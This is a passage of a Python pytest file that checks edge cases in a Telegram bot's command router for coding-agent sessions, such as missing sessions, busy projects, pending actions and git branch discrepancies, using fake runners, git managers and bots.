    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "discrepancy", "stored_branch": "", "current_branch": ""},
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


# ===========================================================================
# session_status_commands.py — handle_compact missing lines (75, 77)
# ===========================================================================


def test_compact_returns_early_when_no_active_session(tmp_path: Path):
    """handle_compact must return early (line 75) when there is no active session."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/compact")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    assert any("No active session" in msg[1] for msg in bot.messages)


def test_compact_returns_early_when_project_busy(tmp_path: Path):
    """handle_compact must return early (line 77) when the project is busy."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="main")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    # Mark project as busy
    import asyncio as _asyncio; _lock = _asyncio.Lock(); asyncio.run(_lock.acquire()); router._workspace_locks["backend"] = _lock

    update = make_update(text="/compact")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    # Message should include "busy" info (project is running)
    assert any("busy" in msg[1].lower() or "running" in msg[1].lower() or "currently" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# session_status_commands.py — handle_queue_continue_callback (line 85)
# ===========================================================================


def test_queue_continue_callback_returns_early_when_query_data_is_none(tmp_path: Path):
    """handle_queue_continue_callback must return silently when query.data is None (line 85)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    query = SimpleNamespace(data=None, answer=None)

    async def fake_answer():
        return None

    query.answer = fake_answer

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_queue_continue_callback(update, context))
    # Should not crash and not send any message
    assert bot.messages == []


# ===========================================================================
# session_status_commands.py — handle_queue_batch_callback (lines 102, 109-110)
# ===========================================================================


def test_queue_batch_callback_returns_early_when_query_data_is_none(tmp_path: Path):
    """handle_queue_batch_callback must return silently when query.data is None (line 102)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    query = SimpleNamespace(data=None, answer=None)

    async def fake_answer():
        return None

    query.answer = fake_answer

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_queue_batch_callback(update, context))
    assert bot.messages == []


def test_queue_batch_callback_sends_no_batch_pending_when_no_pending(tmp_path: Path):
    """handle_queue_batch_callback must edit message with 'no pending' text when pending is None (lines 109-110)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="queuebatch:group", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_queue_batch_callback(update, context))
    assert edited
    # Should say no batch pending
    assert any("pending" in e.lower() or "batch" in e.lower() for e in edited)


# ===========================================================================
# session_lifecycle_commands.py — _resolve_session_prerequisites (line 50)
# ===========================================================================


def test_resolve_session_prerequisites_returns_none_when_provider_unavailable(tmp_path: Path):
    """_resolve_session_prerequisites must return None (line 50) when provider is not available."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # Provider is selected but NOT available
    router._provider_available = lambda provider: False

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    # Session should not have been created
    assert runner.create_calls == []


# ===========================================================================
# session_lifecycle_commands.py — _resolve_session_prerequisites (lines 70-78)
# ===========================================================================


def test_resolve_session_prerequisites_sends_branch_prompt_for_git_repo_without_branch(tmp_path: Path):
    """_resolve_session_prerequisites must send branch selection prompt (lines 70-78)
    when project is a git repo but no branch is selected."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    # No current_branch set in state
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main"])
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    # Should have sent branch selection message
    assert any("branch" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# session_lifecycle_commands.py — _create_session_for_context (lines 136-137)
# ===========================================================================


class FailingCreateRunner(DummyRunner):
    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        from coding_agent_telegram.agent_runner import AgentRunResult
        self.create_calls.append({"provider": provider, "project_path": project_path, "user_message": user_message})
        return AgentRunResult(
            session_id=None,
            success=False,
            assistant_text="",
            error_message="Backend unavailable",
            raw_events=[],
        )


def test_create_session_for_context_returns_false_when_result_failed(tmp_path: Path):
    """_create_session_for_context must return False (lines 136-137) when result.success is False."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = FailingCreateRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls
    assert any("Backend unavailable" in msg[1] or "failed" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# session_lifecycle_commands.py — _continue_pending_action kind="message"
# with empty user_message (lines 212-214)
# ===========================================================================


def test_continue_pending_action_clears_empty_message_and_returns_false(tmp_path: Path):
    """_continue_pending_action must clear pending action and return False (lines 212-214)
    when kind='message' and user_message is empty."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "",  # empty message
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._continue_pending_action(update, context))

    assert result is False
    # Pending action should be cleared
    assert store.get_chat_state("bot-a", 123).get("pending_action") is None


# ===========================================================================
# session_lifecycle_commands.py — _continue_pending_action kind="message"
# when _create_session_for_context fails (line 227)
# ===========================================================================


def test_continue_pending_action_returns_false_when_session_creation_fails(tmp_path: Path):
    """_continue_pending_action must return False (line 227) when session creation fails
    and no active session matches current context."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = FailingCreateRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "do something",
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._continue_pending_action(update, context))

    assert result is False


# ===========================================================================
# session_lifecycle_commands.py — _continue_pending_action unknown kind
# (lines 242-244)
# ===========================================================================


def test_continue_pending_action_handles_unknown_kind(tmp_path: Path):
    """_continue_pending_action must clear action and return False (lines 242-244) for unknown kinds."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "unknown_future_kind",
        "data": "something",
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._continue_pending_action(update, context))

    assert result is False
    assert store.get_chat_state("bot-a", 123).get("pending_action") is None


# ===========================================================================
# session_lifecycle_commands.py — _ensure_active_session_ready_for_run
# no active session (line 254), session not dict (line 257)
# ===========================================================================


def test_ensure_active_session_ready_returns_false_when_no_active_session(tmp_path: Path):
    """_ensure_active_session_ready_for_run must return False (line 254) when no active session."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False


# ===========================================================================
# session_lifecycle_commands.py — _ensure_active_session_ready_for_run
# project folder missing (lines 262-263)
# ===========================================================================


def test_ensure_active_session_ready_returns_false_when_project_missing(tmp_path: Path):
    """_ensure_active_session_ready_for_run must send error and return False (lines 262-263)
    when project folder does not exist."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Create session with non-existent project folder
    store.create_session("bot-a", 123, "sess_a", "session-a", "nonexistent", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False
    assert any("missing" in msg[1].lower() or "not found" in msg[1].lower() or "nonexistent" in msg[1] for msg in bot.messages)


# ===========================================================================
# session_lifecycle_commands.py — _ensure_active_session_ready_for_run
# pending_action is None (line 274)
# ===========================================================================


def test_ensure_active_session_ready_returns_true_when_pending_action_is_none(tmp_path: Path):
    """_ensure_active_session_ready_for_run must return True (line 274) when
    there is a branch discrepancy but no pending action."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="feature")
    # No pending action
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "feature"])

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is True


# ===========================================================================
# session_lifecycle_commands.py — _ensure_active_session_ready_for_run
# branch_resolution is discrepancy (line 277)
# ===========================================================================


def test_ensure_active_session_ready_calls_resolve_discrepancy_when_branch_resolution_is_set(tmp_path: Path):
    """_ensure_active_session_ready_for_run must call _resolve_branch_discrepancy_if_needed
    (line 277) when pending action has branch_resolution with kind=discrepancy."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="feature")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hello",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "feature"])

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    # Should invoke _resolve_branch_discrepancy_if_needed which will prompt for resolution
    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    # Resolution prompts and returns False (branch discrepancy not yet resolved)
    assert result is False


# ===========================================================================
# session_lifecycle_commands.py — handle_new busy (line 300)
# ===========================================================================


def test_handle_new_returns_early_when_project_busy(tmp_path: Path):
    """handle_new must return early (line 300) when the current project is busy."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    # Mark project as busy
    import asyncio as _asyncio; _lock = _asyncio.Lock(); asyncio.run(_lock.acquire()); router._workspace_locks["backend"] = _lock

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert any("busy" in msg[1].lower() or "running" in msg[1].lower() or "currently" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# session_branch_resolution.py — _multi_branch_source_keyboard (via ProjectCommandMixin)
# ===========================================================================


def test_session_branch_resolution_multi_keyboard_skips_empty_source_branches(tmp_path: Path):
    """_multi_branch_source_keyboard skips empty/None source branches."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"], default_branch="main")

    result = router._multi_branch_source_keyboard(
        new_branch="feature",
        source_branches=["", "main"],
        project_path=backend,
    )

    assert result is not None


# ===========================================================================
# session_branch_resolution.py — _offer_branch_source_fallback (line 92)
# ===========================================================================


def test_offer_branch_source_fallback_returns_false_when_keyboard_is_none(tmp_path: Path):
    """_offer_branch_source_fallback must return False (line 92) when the keyboard is None."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # No branches exist so _multi_branch_source_keyboard returns None
    router.git = FakeGitManager(is_git_repo=True, current_branch="", default_branch="", local_branches=[])

    result = asyncio.run(router._offer_branch_source_fallback(
        None,
        project_folder="backend",
        project_path=backend,
        source_kind="origin",
        source_branch="deleted-branch",
        new_branch="feature",
        error_message="fatal: not found",
    ))

    assert result is False


# ===========================================================================
# session_branch_resolution.py — _offer_branch_source_fallback (line 104)
# ===========================================================================


def test_offer_branch_source_fallback_adds_current_branch_line_when_different_from_default(tmp_path: Path):
    """_offer_branch_source_fallback must append current_branch info (line 104)
    when current_branch differs from default_branch."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # current_branch != default_branch
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="develop",
        default_branch="main",
        local_branches=["main", "develop"],
    )

    edited = []

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query = SimpleNamespace(edit_message_text=fake_edit)

    result = asyncio.run(router._offer_branch_source_fallback(
        query,
        project_folder="backend",
        project_path=backend,
        source_kind="origin",
        source_branch="deleted-branch",
        new_branch="feature",
        error_message="fatal: not found",
    ))

    assert result is True
    assert edited
    assert "develop" in edited[-1]


# ===========================================================================
# session_branch_resolution.py — _resolve_branch_discrepancy_if_needed
# missing paths (lines 143, 147, 173, 184)
# ===========================================================================


def test_resolve_branch_discrepancy_returns_true_when_no_pending_action(tmp_path: Path):
    """_resolve_branch_discrepancy_if_needed returns True (line 143) when there is no pending action."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_branch_discrepancy_returns_true_when_branch_resolution_not_dict(tmp_path: Path):
    """_resolve_branch_discrepancy_if_needed returns True (line 147) when
    branch_resolution is not a dict."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi"})
    # No branch_resolution key → branch_resolution is None, not a dict
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_branch_discrepancy_returns_true_when_discrepancy_branches_empty(tmp_path: Path):
    """_resolve_branch_discrepancy_if_needed returns True (line 173) when
    stored_branch or current_branch is empty in a discrepancy resolution."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "",  # empty
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


def test_resolve_branch_discrepancy_returns_true_when_kind_not_discrepancy(tmp_path: Path):
    """_resolve_branch_discrepancy_if_needed returns True (line 184) when
    branch_resolution kind is not 'discrepancy'."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "switch_source",  # not "discrepancy"
            "new_branch": "feature",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._resolve_branch_discrepancy_if_needed(update, context))
    assert result is True


# ===========================================================================
# session_branch_resolution.py — handle_branch_discrepancy_callback
# missing paths (lines 190, 195, 211-212, 217-220, 244-247, 271-278)
# ===========================================================================


def test_branch_discrepancy_callback_returns_when_query_data_is_none(tmp_path: Path):
    """handle_branch_discrepancy_callback returns silently (line 190) when query.data is None."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    query = SimpleNamespace(data=None, answer=None)

    async def fake_answer():
        return None

    query.answer = fake_answer

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert bot.messages == []


def test_branch_discrepancy_callback_returns_on_invalid_choice(tmp_path: Path):
    """handle_branch_discrepancy_callback returns silently (line 195) for invalid choices."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    query = SimpleNamespace(data="branchdiscrepancy:invalid", answer=None)

    async def fake_answer():
        return None

    query.answer = fake_answer

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert bot.messages == []


def test_branch_discrepancy_callback_sends_no_pending_when_no_pending_action(tmp_path: Path):
    """handle_branch_discrepancy_callback sends 'no pending' message when pending_action is None."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    assert any("pending" in e.lower() for e in edited)


def test_branch_discrepancy_callback_sends_no_pending_discrepancy_for_wrong_kind(tmp_path: Path):
    """handle_branch_discrepancy_callback sends 'no pending discrepancy' when
    branch_resolution kind is not 'discrepancy'."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {"kind": "switch_source"},  # not discrepancy
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    assert any("discrepancy" in e.lower() or "pending" in e.lower() for e in edited)


def test_branch_discrepancy_callback_sends_no_session_when_session_missing(tmp_path: Path):
    """handle_branch_discrepancy_callback sends 'no active session' (lines 211-212)
    when active session is not found."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Set pending action with discrepancy but NO active session
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    assert any("session" in e.lower() for e in edited)


def test_branch_discrepancy_callback_sends_error_when_project_missing(tmp_path: Path):
    """handle_branch_discrepancy_callback edits message (lines 217-220) when
    project folder does not exist."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "nonexistent-project", "codex", branch_name="feature")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    assert any("missing" in e.lower() or "nonexistent" in e for e in edited)


def test_branch_discrepancy_callback_stored_unavailable_no_fallback(tmp_path: Path):
    """handle_branch_discrepancy_callback sends 'no fallback' message (lines 244-247)
    when stored branch is unavailable and there are no fallback sources."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="missing-branch")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "missing-branch",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # No local or remote branches at all (so no fallback either)
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="",
        local_branches=[],
    )

    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    # Should show "stored branch unavailable, no fallback" message
    assert any("unavailable" in e[0].lower() or "missing-branch" in e[0] for e in edited)


def test_branch_discrepancy_callback_stored_available_offers_restore_choice(tmp_path: Path):
    """handle_branch_discrepancy_callback offers a restore choice (lines 271-278)
    when stored branch exists locally or remotely."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="feature")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "hi",
        "branch_resolution": {
            "kind": "discrepancy",
            "stored_branch": "feature",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # "feature" exists locally
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main", "feature"],
    )

